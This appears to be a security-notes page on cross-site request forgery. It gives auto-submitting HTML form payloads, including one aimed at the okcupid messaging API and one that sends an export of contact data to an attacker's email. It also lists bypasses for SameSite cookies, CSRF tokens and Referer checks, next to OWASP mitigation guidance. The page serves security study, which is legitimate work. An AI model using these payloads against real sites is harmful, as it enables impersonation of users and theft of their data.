---
description: Making a request on the user's behalf.
---

# Cross Site Request Forgery (CSRF)

## Overview

If a website automatically sends a user's credentials when you interact with it (cookies are sent automatically), then CSRF can be used to impersonate the user (assuming the website doesn't do anything to prevent it).

## Common CSRF Payloads

Different types of endpoints require different techniques:

* POST
* GET
* DELETE/UPDATE
* JSON endpoint
* XML endpoint

### POST

Make a POST form with hidden inputs and use JavaScript to send the POST request automatically when the user navigates to the page.

### GET

Make an image with zero width and length and `src=`t`he_csrf_Link`. The GET request is made automatically when the browser tries to load the image.

### PUT/DELETE

This one is very difficult. Can only be accomplished with like browser plugins/plugin vulns and stuff.

### JSON

You can try to do a CSRF request to a JSON API endpoint.

{% embed url="https://blog.azuki.vip/csrf/" %}
\

{% endembed %}

**Caveats** (as of august 2021):

* The server must not require **content-type: application/json** in the headers. The method results in a request with a **content-type: text/plain**  header
* This method results in one of the fields in the JSON request being `"foo":"="`. In other words, the server must not deny the request because of an **unexpected field**, or an **expected field with the value** `=`
* The SameSite cookie attribute must not be Strict
  * It defaults to **Lax** on browsers
  * In Firefox, it always works when SameSite has not been set
    * Haven’t tested when SameSite has been explicitly set to Lax
  * In Chrome, it works when SameSite has not been set
    * But only for **two minutes**, starting from the time the cookie was assigned to the user
    * Probably won’t work if SameSite has been explicitly set to Lax





Sample payload from the article. Sends a JSON request to the okcupid API:

```
<html>  
 <body>  
   <form id="form" method="post" action="https://www.okcupid.com/1/apitun/messages/send" enctype="text/plain"\>  
     <input style='display:none' name='{"foo":"' value='", "receiverid":"123", "body":"i am a rabbit", "source":"desktop\_global", "service":"other"}'\>  
     <input type="submit" value="Click me"\>  
   </form>  
   <script>  
     window.onload = () => {form.submit()}  
   </script>  
 </body>  
</html>
```

Zseano also talked about it in his [blog article](https://web.archive.org/web/20190523101945/https://zseano.com/tutorials/5.html). Here's his payload (but his is **older**):

```
<html>
     <body>
        <form ENCTYPE="text/plain" action="http://vulnsite.com/snip/snippet.php" method="post"> 
        <input type="hidden" name="{"params":{"limit":20,"and":false,"filters":[],"excluded_contacts":[]},"fields":["First Name","Last Name","Email Address","Title","Notes","Organization","Street","City","State","Tags","Zip Code","Phone Number","Gender","Event ID","Event Title","VIP","Twitter Handle","Twitter URL","Twitter Followers","Twitter Following","Facebook Name","Facebook URL","Facebook Friends","Instagram Handle","Instagram URL","Instagram Followers","Instagram Following","Website","Date Added","Unsubscribed"],"recipient":"myemail+2" value='@gmail.com'>
         <input type="submit" value="submit"> </form>
     </body>
  </html>
  
```

### XML

From Zseano's [blog](https://web.archive.org/web/20190523101945/https://zseano.com/tutorials/5.html):

```
<html>
     <body>
        <form ENCTYPE="text/plain" action="http://vulnsite.com/snip/snippet.php" method="post"> 
        <input type="hidden" name="<foo> <html xmlns:html='http://www.w3.org/1999/xhtml'> <html:script>alert(1);</html:script> </html> </foo>">
         <input type="submit" value="submit"> </form>
     </body>
  </html>
```

## Login CSRF

{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#login-csrf" %}

Many developers tend to ignore CSRF vulnerabilities on login forms. They assume that CSRF would not be applicable on login forms because the user is not authenticated at that stage. However, CSRF vulnerabilities can still occur on login forms where the user is not authenticated, but the impact and risk is different.

For example, if an attacker uses CSRF to authenticate a victim on a shopping website using the attacker's account, and the victim then enters their credit card information, an attacker may be able to purchase items using the victim's stored card details

## Mitigations

OWASP Prevention Cheat Sheet

{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" %}

### SameSite

The default option for [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) these days is **Lax**, which stops a lot of CSRF requests (cookies aren't sent with POST requests from other domains).

The web application is still vulnerable if:

* It does something sensitive in response to a GET request -- cookies are still sent along with GET requests if the user navigates to the site.
* The CSRF comes from a subdomain. For example, pages.github.com can still CSRF github.com.
* [Chrome SameSite Lax+POST](cross-site-request-forgery-csrf.md#chrome-default-samesite-bypass)

## Mitigation Bypasses

### Chrome Default SameSite Lax+POST Bypass

{% embed url="https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b" %}

While Chrome does set cookies to SameSite=Lax by default, for the first two minutes after the cookie was set, the policy is effectively SameSite=None. This can be used to exploit CSRF in certain cases.

### CSRF Tokens

If an anti-CSRF token is added, you can bypass it with:

* XSS
* Steal the CSRF token (using CSS injection, for example)
* Clickjacking
  * If you can fill in the data you want for them, and then clickjack them into hitting “submit” (through an iframe), then you can make a request on their behalf
* CSRF token misconfigurations
  * Try a blank csrf token
  * Try to see if accounts can share the same CSRF token. Make 2 accounts and see if the same token works for both.
  * Change one character in the token, maybe it only checks length or something.

### Referrer Header Checking



If the Referrer header is checked, then you can try a few things: &#x20;

1. If `site.com/csrf` checks that "site.com" is in the string, you can send the query from `malicious.com/site.com` or `site.com.malicious.com` .
2. Send a blank referrer header and see if that works
3. Use XSS (like reflected XSS) to achieve the goal.





